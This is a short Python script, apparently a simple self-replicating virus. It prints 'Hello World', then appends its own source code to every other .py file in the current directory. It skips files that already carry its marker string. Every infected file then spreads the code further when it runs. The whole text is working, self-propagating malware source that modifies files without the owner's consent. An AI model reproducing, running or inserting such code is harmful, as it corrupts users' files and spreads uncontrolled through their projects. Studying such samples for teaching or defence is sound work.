print("Hello World")
import os

def infect(filename):
    
    #read the content of the file  
    with open(filename, 'r') as file:
        code = file.read()
    
    #check if the file is already infected
    if "Ahmed Was Here_iyg8egf8eyg" in code:
        print("Already infected: ", filename)
        return
    else:
        #read the content of the current working file
        with open(__file__, 'r') as file:
            current_code = file.read()

        print("Infecting: ", filename)
        with open(filename, 'a') as file:
            #write the content of the current file to the infected file
            file.write("\n"+current_code)
    return


#Read the current directory files and loop thru them
for filename in os.listdir("."):
    #check if the file is a python file and not the current file
    if filename.endswith(".py") and filename != os.path.basename(__file__):
        #infect the file
        infect(filename)
